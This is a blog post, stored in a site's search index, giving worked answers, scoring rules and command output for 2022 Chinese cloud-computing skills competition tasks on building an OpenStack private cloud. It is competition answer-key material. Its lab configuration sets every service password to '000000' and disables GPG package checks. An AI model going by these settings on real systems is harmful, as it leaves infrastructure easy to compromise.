<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>云计算方向-2022年云计算职业技能大赛国赛题</title>
    <url>/posts/6bf8b7d7.html</url>
    <content><![CDATA[<h1 id="第一套"><a href="#第一套" class="headerlink" title="第一套"></a>第一套</h1><h2 id="【任务-1】私有云服务搭建-10分"><a href="#【任务-1】私有云服务搭建-10分" class="headerlink" title="【任务 1】私有云服务搭建[10分]"></a><strong>【任务</strong> 1】私有云服务搭建[10分]</h2><h3 id="【题目-1】基础环境配置-0-5-分"><a href="#【题目-1】基础环境配置-0-5-分" class="headerlink" title="【题目 1】基础环境配置[0.5 分]"></a>【题目 1】基础环境配置[0.5 分]</h3><p>使用提供的用户名密码，登录提供的 OpenStack 私有云平台，在当前租户下，使用CentOS7.9 镜像，创建两台云主机，云主机类型使用 4vCPU&#x2F;12G&#x2F;100G_50G 类型。当前租户下默认存在一张网卡，自行创建第二张网卡并连接至 controller 和 compute 节点（第二张网卡的网段为 10.10.X.0&#x2F;24，X 为工位号，不需要创建路由）。自行检查安全组策略，以确保网络正常通信与 ssh 连接，然后按以下要求配置服务器：</p>
<p>（1）设置控制节点主机名为 controller，设置计算节点主机名为 compute； </p>
<p>（2）修改 hosts 文件将 IP 地址映射为主机名；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.查看控制节点名字为 controller 正确计 0.2 分</span><br><span class="line">2.查看 hosts 文件中有正确的主机名和 IP 映射计 0.2 分</span><br><span class="line">3.控制节点正确使用两块网卡计 0.1 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# hostname</span><br><span class="line">controller</span><br><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line">[root@controller ~]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:3d:4b:e6 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.100.10/24 brd 192.168.100.255 scope global noprefixroute ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::ee56:e4e:d291:8f31/64 scope <span class="built_in">link</span> noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: ens34: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:3d:4b:f0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.200.10/24 brd 192.168.200.255 scope global noprefixroute ens34</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::fe7c:1bec:9978:2d47/64 scope <span class="built_in">link</span> noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<h3 id="【题目-2】Yum-源配置-0-5-分"><a href="#【题目-2】Yum-源配置-0-5-分" class="headerlink" title="【题目 2】Yum 源配置[0.5 分]"></a>【题目 2】Yum 源配置[0.5 分]</h3><p>使用提供的 http 服务地址，在 http 服务下，存在 centos7.9 和 iaas 的网络 yum 源，使用该 http 源作为安装 iaas 平台的网络源。分别设置 controller 节点和 compute 节点的 yum 源文件 http.repo。完成后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.查看/etc/yum.repos.d/http.repo 文件，有正确的 baseurl 路径，计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#直接删除默认源</span></span><br><span class="line"><span class="built_in">rm</span> -rf /etc/yum.repos.d/*</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建http类型的yum源</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/yum.repos.d/http.repo &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[centos]</span></span><br><span class="line"><span class="string">name=centos</span></span><br><span class="line"><span class="string">baseurl=http://192.168.100.100/centos</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">[iaas]</span></span><br><span class="line"><span class="string">name=iaas</span></span><br><span class="line"><span class="string">baseurl=http://192.168.100.100/iaas/iaas-repo</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以通过来验证源的配置是否正确</span></span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>

<h3 id="【题目-3】配置无秘钥-ssh-0-5-分"><a href="#【题目-3】配置无秘钥-ssh-0-5-分" class="headerlink" title="【题目 3】配置无秘钥 ssh[0.5 分]"></a>【题目 3】配置无秘钥 ssh[0.5 分]</h3><p>配置 controller 节点可以无秘钥访问 compute 节点，配置完成后，尝试 ssh 连接 compute节点的 hostname 进行测试。完成后提交 controller 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.查看控制节点允许计算节点无秘钥登录计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# ssh root@compute</span><br><span class="line">The authenticity of host <span class="string">&#x27;compute (192.168.100.20)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:w8T7ol8B+536sySmpugXGrPle6li9IMnc+ijwbcgjLc.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is MD5:31:1d:72:34:56:3d:fa:0c:71:30:cf:f4:77:66:b0:b6.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>compute<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Last login: Wed Oct 12 15:13:34 2022</span></span><br><span class="line"><span class="string">[root@compute ~]# hostname</span></span><br><span class="line"><span class="string">compute</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建密钥（回车即可）</span></span><br><span class="line">ssh-keygen</span><br><span class="line"><span class="comment">#上传密钥</span></span><br><span class="line">ssh-copy-id root@192.168.100.20</span><br><span class="line"><span class="comment">#验证</span></span><br><span class="line">ssh root@compute</span><br><span class="line">hostname</span><br></pre></td></tr></table></figure>

<h3 id="【题目-4】基础安装-0-5-分"><a href="#【题目-4】基础安装-0-5-分" class="headerlink" title="【题目 4】基础安装[0.5 分]"></a>【题目 4】基础安装[0.5 分]</h3><p>在控制节点和计算节点上分别安装 openstack-iaas 软件包，根据表 2 配置两个节点脚本文件中的基本变量（配置脚本文件为&#x2F;etc&#x2F;openstack&#x2F;openrc.sh）。</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20221012153852874.png" alt="image-20221012153852874"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查环境变量文件配置正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">###0.提前准备</span></span><br><span class="line"><span class="comment">#分区</span></span><br><span class="line"><span class="comment">#在 compute 节点上利用空白分区划分 2个 20G 分区作为cinder与swift的存储</span></span><br><span class="line"><span class="comment">#划分1个5G的硬盘做为manila1的存储，见题目11</span></span><br><span class="line"><span class="comment">#划分1个5G的硬盘做为cinder扩展磁盘，见题目12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装openstack-iaas</span></span><br><span class="line">yum install -y openstack-iaas</span><br><span class="line"><span class="comment">###2.编辑环境变量，简化脚本</span></span><br><span class="line"><span class="comment">#使用vi底行模式，正则表达式如下</span></span><br><span class="line">:%s@##.*@@g	<span class="comment">#删除文件中开头##的所在行</span></span><br><span class="line">:%s@#@@g		<span class="comment">#删除文件中开头的#</span></span><br><span class="line">:g@^<span class="variable">$@d</span>		<span class="comment">#删除文件中所有的空行</span></span><br><span class="line">:%s/PASS=/PASS=000000/g  <span class="comment">#快速配置文件中个服务组件的password</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#环境变量文件示例</span></span><br><span class="line">HOST_IP=192.168.100.10		<span class="comment">#controller ip address，按照实际环境来</span></span><br><span class="line">HOST_PASS=000000</span><br><span class="line">HOST_NAME=controller</span><br><span class="line">HOST_IP_NODE=192.168.100.20		<span class="comment">#compute ip address，按照实际环境来</span></span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line">network_segment_IP=192.168.100.0/24		</span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line">DB_PASS=000000</span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line">PLACEMENT_DBPASS=000000</span><br><span class="line">PLACEMENT_PASS=000000</span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line">NOVA_PASS=000000</span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line">INTERFACE_NAME=ens34</span><br><span class="line">Physical_NAME=provider</span><br><span class="line">minvlan=1</span><br><span class="line">maxvlan=200</span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line">CINDER_PASS=000000</span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.100.20 	<span class="comment">#compute IP</span></span><br><span class="line">TROVE_DBPASS=000000</span><br><span class="line">TROVE_PASS=000000</span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line">HEAT_PASS=000000</span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line">AODH_PASS=000000</span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line">ZUN_PASS=000000</span><br><span class="line">KURYR_PASS=000000</span><br><span class="line">OCTAVIA_DBPASS=000000</span><br><span class="line">OCTAVIA_PASS=000000</span><br><span class="line">MANILA_DBPASS=000000</span><br><span class="line">MANILA_PASS=000000</span><br><span class="line">SHARE_DISK=sdb3				    <span class="comment">#manila—Disk</span></span><br><span class="line">CLOUDKITTY_DBPASS=000000</span><br><span class="line">CLOUDKITTY_PASS=000000</span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line">BARBICAN_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">###首先执行初始化包###</span></span><br><span class="line">(all node)</span><br><span class="line">iaas-pre-host.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">###3.controller node执行</span></span><br><span class="line">iaas-install-mysql.sh &amp;&amp; iaas-install-keystone.sh &amp;&amp; iaas-install-glance.sh \</span><br><span class="line">&amp;&amp; iaas-install-placement.sh &amp;&amp; iaas-install-nova-controller.sh \</span><br><span class="line">&amp;&amp; iaas-install-neutron-controller.sh &amp;&amp; iaas-install-dashboard.sh \</span><br><span class="line">&amp;&amp; iaas-install-cinder-controller.sh &amp;&amp; iaas-install-swift-controller.sh  \</span><br><span class="line">&amp;&amp; iaas-install-heat.sh &amp;&amp; iaas-install-manila-controller.sh \</span><br><span class="line">&amp;&amp; iaas-install-cloudkitty.sh &amp;&amp; iaas-install-barbican.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">###4.compute node 执行</span></span><br><span class="line"><span class="comment">#提示：当控制节点在部署脚本的时候，计算节点也别闲着，可以为其安装相应的包</span></span><br><span class="line"><span class="built_in">cat</span> /usr/local/bin/iaas-*compute.sh | grep yum </span><br><span class="line"></span><br><span class="line"><span class="comment">#然后将如上罗列出来的内容全部安装后，等待controller节点的脚本执行后，执行如下内容</span></span><br><span class="line">iaas-install-nova-compute.sh  &amp;&amp; iaas-install-neutron-compute.sh \</span><br><span class="line">&amp;&amp; iaas-install-cinder-compute.sh &amp;&amp; iaas-install-swift-compute.sh \</span><br><span class="line">&amp;&amp; iaas-install-manila-compute.sh </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="【题目-5】数据库安装与调优-0-5-分"><a href="#【题目-5】数据库安装与调优-0-5-分" class="headerlink" title="【题目 5】数据库安装与调优[0.5 分]"></a>【题目 5】数据库安装与调优[0.5 分]</h3><p>在 controller 节点上使用 iaas-install-mysql.sh 脚本安装 Mariadb、Memcached、RabbitMQ</p>
<p>等服务。安装服务完毕后，修改&#x2F;etc&#x2F;my.cnf 文件，完成下列要求：</p>
<p>1.设置数据库支持大小写；</p>
<p>2.设置数据库缓存 innodb 表的索引，数据，插入数据时的缓冲为 4G；</p>
<p>3.设置数据库的 log buffer 为 64MB；</p>
<p>4.设置数据库的 redo log 大小为 256MB；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查数据库配置正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mysql -uroot -p000000 -e <span class="string">&quot; show variables like &#x27;innodb_log%&#x27;;&quot;</span></span><br><span class="line">+-----------------------------+-----------+</span><br><span class="line">| Variable_name               | Value     |</span><br><span class="line">+-----------------------------+-----------+</span><br><span class="line">| innodb_log_buffer_size      | 67108864  |</span><br><span class="line">| innodb_log_checksums        | ON        |</span><br><span class="line">| innodb_log_compressed_pages | ON        |</span><br><span class="line">| innodb_log_file_size        | 268435456 |</span><br><span class="line">| innodb_log_files_in_group   | 2         |</span><br><span class="line">| innodb_log_group_home_dir   | ./        |</span><br><span class="line">| innodb_log_optimize_ddl     | ON        |</span><br><span class="line">| innodb_log_write_ahead_size | 8192      |</span><br><span class="line">+-----------------------------+-----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line"><span class="comment">#大小写敏感</span></span><br><span class="line">lower_case_table_names = 1</span><br><span class="line"><span class="comment">#缓存区</span></span><br><span class="line">innodb_buffer_pool_size = 4G</span><br><span class="line"><span class="comment">#设置数据库的 log buffer</span></span><br><span class="line">innodb_log_buffer_size = 64M</span><br><span class="line"><span class="comment">#InnoDB redo log大小</span></span><br><span class="line">innodb_log_file_size = 256M</span><br><span class="line"><span class="comment">#设置数据库的 redo log 文件组为 2</span></span><br><span class="line">innodb_log_files_in_group = 2</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart mariadb</span><br></pre></td></tr></table></figure>

<h3 id="【题目-6】Keystone-服务安装与使用-0-5-分"><a href="#【题目-6】Keystone-服务安装与使用-0-5-分" class="headerlink" title="【题目 6】Keystone 服务安装与使用[0.5 分]"></a>【题目 6】Keystone 服务安装与使用[0.5 分]</h3><p>在 controller 节点上使用 iaas-install-keystone.sh 脚本安装 Keystone 服务。安装完成后，使用相关命令，创建用户 chinaskill，密码为 000000。完成后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 keystone 服务安装正确计 0.2 分</span><br><span class="line">2.检查 chinaskill 用户创建正确计 0.3 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack user show chinaskill</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | default                          |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| <span class="built_in">id</span>                  | f79373ccd5d34b34a023f18c5f181826 |</span><br><span class="line">| name                | chinaskill                       |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br></pre></td></tr></table></figure>

<p>过程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/keystone/admin-openrc.sh</span><br><span class="line"><span class="comment">#创建用户</span></span><br><span class="line">openstack user create chinaskill --password 000000</span><br><span class="line"><span class="comment">#查看是否创建成功</span></span><br><span class="line">openstack user show chinaskill</span><br></pre></td></tr></table></figure>

<h3 id="【题目-7】Glance-安装与使用-0-5-分"><a href="#【题目-7】Glance-安装与使用-0-5-分" class="headerlink" title="【题目 7】Glance 安装与使用[0.5 分]"></a>【题目 7】Glance 安装与使用[0.5 分]</h3><p>在 controller 节点上使用 iaas-install-glance.sh 脚本安装 glance 服务。使用命令将提供的 cirros-0.3.4-x86_64-disk.img 镜像（该镜像在 HTTP 服务中，可自行下载）上传至平台，命名为 cirros，并设置最小启动需要的硬盘为 10G，最小启动需要的内存为 1G。完成后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 glance 服务安装正确计 0.1 分</span><br><span class="line">2.检查 cirros 镜像最小启动硬盘与内存配置正确计 0.4 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack image show cirros</span><br><span class="line">+------------------+------------------------------------------------------------------------                                                                                             --------------------------------------------------------------------------------------------                                                                                             ------------------------+</span><br><span class="line">| Field            | Value                                                                                                                                                                                                                                                                                                                                                                                |</span><br><span class="line">+------------------+------------------------------------------------------------------------                                                                                             --------------------------------------------------------------------------------------------                                                                                             ------------------------+</span><br><span class="line">| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                                                                                                                                                                                                                                                                                                                                                     |</span><br><span class="line">| container_format | bare                                                                                                                                                                                                                                                                                                                                                                                 |</span><br><span class="line">| created_at       | 2022-10-12T08:42:35Z                                                                                                                                                                                                                                                                                                                                                                 |</span><br><span class="line">| disk_format      | qcow2                                                                                                                                                                                                                                                                                                                                                                                |</span><br><span class="line">| file             | /v2/images/b757b50b-fd2c-4a42-9bff-31dcf0585917/file                                                                                                                                                                                                                                                                                                                                 |</span><br><span class="line">| <span class="built_in">id</span>               | b757b50b-fd2c-4a42-9bff-31dcf0585917                                                                                                                                                                                                                                                                                                                                                 |</span><br><span class="line">| min_disk         | 10                                                                                                                                                                                                                                                                                                                                                                                   |</span><br><span class="line">| min_ram          | 1024                                                                                                                                                                                                                                                                                                                                                                                 |</span><br><span class="line">| name             | cirros                                                                                                                                                                                                                                                                                                                                                                               |</span><br><span class="line">| owner            | ef3705db528144cc9a33f8ace06d6d3b                                                                                                                                                                                                                                                                                                                                                     |</span><br><span class="line">| properties       | os_hash_algo=<span class="string">&#x27;sha512&#x27;</span>, os_hash_value=<span class="string">&#x27;1b03ca1bc3fafe448b90583c12f367949                                                                                             f8b0e665685979d95b004e48574b953316799e23240f4f739d1b5eb4c4ca24d38fdc6f4f9d8247a2bc64db25d6bb                                                                                             db2&#x27;</span>, os_hidden=<span class="string">&#x27;False&#x27;</span> |</span><br><span class="line">| protected        | False                                                                                                                                                                                                                                                                                                                                                                                |</span><br><span class="line">| schema           | /v2/schemas/image                                                                                                                                                                                                                                                                                                                                                                    |</span><br><span class="line">| size             | 13287936                                                                                                                                                                                                                                                                                                                                                                             |</span><br><span class="line">| status           | active                                                                                                                                                                                                                                                                                                                                                                               |</span><br><span class="line">| tags             |                                                                                                                                                                                                                                                                                                                                                                                      |</span><br><span class="line">| updated_at       | 2022-10-12T08:43:47Z                                                                                                                                                                                                                                                                                                                                                                 |</span><br><span class="line">| virtual_size     | None                                                                                                                                                                                                                                                                                                                                                                                 |</span><br><span class="line">| visibility       | shared                                                                                                                                                                                                                                                                                                                                                                               |</span><br><span class="line">+------------------+------------------------------------------------------------------------                                                                                             --------------------------------------------------------------------------------------------                                                                                             ------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建镜像</span></span><br><span class="line">openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line"><span class="comment">#设置镜像最小启动需要的硬盘为 10G，最小启动需要的内存为 1G</span></span><br><span class="line">openstack image <span class="built_in">set</span> cirros --min-disk 10 --min-ram 1024</span><br></pre></td></tr></table></figure>

<h3 id="【题目-8】Nova-安装与优化-0-5-分"><a href="#【题目-8】Nova-安装与优化-0-5-分" class="headerlink" title="【题目 8】Nova 安装与优化[0.5 分]"></a>【题目 8】Nova 安装与优化[0.5 分]</h3><p>在 controller 节点和 compute 节点上分别使用 iaas-install-placement.sh 脚本、iaas-install-nova -controller.sh 脚本、iaas-install-nova-compute.sh 脚本安装 Nova 服务。安装完成后，请修改 nova 相关配置文件，解决因等待时间过长而导致虚拟机启动超时从而获取不到 IP 地址而报错失败的问题。配置完成后提交 controller 点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 nova 服务解决超时问题配置正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/nova/nova.conf |grep vif_plugging_is_fatal</span><br><span class="line">vif_plugging_is_fatal=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/nova/nova.conf </span><br><span class="line">vif_plugging_is_fatal=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启nova服务</span></span><br><span class="line">systemctl restart openstack-nova*</span><br></pre></td></tr></table></figure>

<h3 id="【题目-9】Neutron-安装-0-5-分"><a href="#【题目-9】Neutron-安装-0-5-分" class="headerlink" title="【题目 9】Neutron 安装[0.5 分]"></a>【题目 9】Neutron 安装[0.5 分]</h3><p>使用提供的脚本 iaas-install-neutron-controller.sh 和 iaas-install-neutron-compute.sh，在controller 和 compute 节点上安装neutron 服务。完成后提交控制节点的用户名、密码和 IP地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 neutron 服务安装正确计 0.2 分</span><br><span class="line">2.检查 neutron 服务的 linuxbridge 网桥服务启动正确计 0.3 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-service status | grep linuxbridge</span><br><span class="line">MainPID=17877 Id=neutron-linuxbridge-agent.service ActiveState=active</span><br></pre></td></tr></table></figure>

<h3 id="【题目-10】Doshboard-安装-0-5-分"><a href="#【题目-10】Doshboard-安装-0-5-分" class="headerlink" title="【题目 10】Doshboard 安装[0.5 分]"></a>【题目 10】Doshboard 安装[0.5 分]</h3><p>在controller节点上使用iaas-install-dashboad.sh脚本安装dashboad服务。安装完成后，将 Dashboard 中的 Djingo 数据修改为存储在文件中（此种修改解决了 ALL-in-one 快照在其他云平台 Dashboard 不能访问的问题）。完成后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.检查 Dashboard 服务安装正确计 0.2 分</span><br><span class="line">2.检查 Dashboard 服务中 Djingo 数据修改为存储在文件中配置正确计 0.3 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/openstack-dashboard/local_settings |grep django</span><br><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.file&#x27;</span></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/openstack-dashboard/local_settings</span><br><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.file&#x27;</span></span><br><span class="line"><span class="comment">#重启服务生效配置</span></span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>

<h3 id="【题目-11】Swift-安装-0-5-分"><a href="#【题目-11】Swift-安装-0-5-分" class="headerlink" title="【题目 11】Swift 安装[0.5 分]"></a>【题目 11】Swift 安装[0.5 分]</h3><p>在 控 制 节 点 和 计 算 节 点 上 分 别 使 用 iaas-install-swift-controller.sh 和iaas-install-swift-compute.sh 脚本安装 Swift 服务。安装完成后，使用命令创建一个名叫examcontainer 的容器，将 cirros-0.3.4-x86_64-disk.img 镜像上传到 examcontainer 容器中，并设置分段存放，每一段大小为 10M。完成后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 swift 服务安装正确计 0.3 分</span><br><span class="line">2.分段上传 cirros 镜像正确计 0.2 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# swift <span class="built_in">stat</span> examcontainer  cirros-0.3.4-x86_64-disk.img</span><br><span class="line">               Account: AUTH_ef3705db528144cc9a33f8ace06d6d3b</span><br><span class="line">             Container: examcontainer</span><br><span class="line">                Object: cirros-0.3.4-x86_64-disk.img</span><br><span class="line">          Content Type: application/octet-stream</span><br><span class="line">        Content Length: 13287936</span><br><span class="line">         Last Modified: Wed, 12 Oct 2022 09:32:27 GMT</span><br><span class="line">                  ETag: <span class="string">&quot;5cde37512919eda28a822e472bb0a2dd&quot;</span></span><br><span class="line">              Manifest: examcontainer_segments/cirros-0.3.4-x86_64-disk.img/1665563891.781025/13287936/10485760/</span><br><span class="line">            Meta Mtime: 1665563891.781025</span><br><span class="line">         Accept-Ranges: bytes</span><br><span class="line">           X-Timestamp: 1665567146.81794</span><br><span class="line">            X-Trans-Id: tx47b60b986ef545d19e59d-00634689e7</span><br><span class="line">X-Openstack-Request-Id: tx47b60b986ef545d19e59d-00634689e7</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建examcontainer容器</span></span><br><span class="line">swift post examcontainer</span><br><span class="line"><span class="comment">#将镜像分段上传</span></span><br><span class="line">swift  upload examcontainer -S 10485760 cirros-0.3.4-x86_64-disk.img</span><br><span class="line"><span class="comment">#查看是否成功上传</span></span><br><span class="line"> swift <span class="built_in">stat</span> examcontainer  cirros-0.3.4-x86_64-disk.img</span><br></pre></td></tr></table></figure>

<h3 id="【题目-12】Cinder-创建硬盘-0-5-分"><a href="#【题目-12】Cinder-创建硬盘-0-5-分" class="headerlink" title="【题目 12】Cinder 创建硬盘[0.5 分]"></a>【题目 12】Cinder 创建硬盘[0.5 分]</h3><p>在 控 制 节 点 和 计 算 节 点 分 别 使 用 </p>
<p>iaas-install-cinder-controller.sh 、iaas-install-cinder-compute.sh 脚本安装 Cinder 服务，请在计算节点，对块存储进行扩容操作，即在计算节点再分出一个 5G 的分区，加入到 cinder 块存储的后端存储中去。完成后提交计算节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 cinder 后端存储扩容成功计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vgdisplay</span><br><span class="line">--- Volume group ---</span><br><span class="line">  VG Name               cinder-volumes</span><br><span class="line">  System ID</span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        2</span><br><span class="line">  Metadata Sequence No  5</span><br><span class="line">  VG Access             <span class="built_in">read</span>/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                1</span><br><span class="line">  Open LV               0</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                2</span><br><span class="line">  Act PV                2</span><br><span class="line">  VG Size               49.99 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              12798</span><br><span class="line">  Alloc PE / Size       9748 / &lt;38.08 GiB</span><br><span class="line">  Free  PE / Size       3050 / 11.91 GiB</span><br><span class="line">  VG UUID               DgfDCG-y8uU-Slr0-V9J5-jw1H-nrsT-SokTeh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建物理卷</span></span><br><span class="line">pvcreate /dev/sdc2</span><br><span class="line"><span class="comment">#扩展</span></span><br><span class="line">vgextend cinder-volumes /dev/sdc2</span><br></pre></td></tr></table></figure>



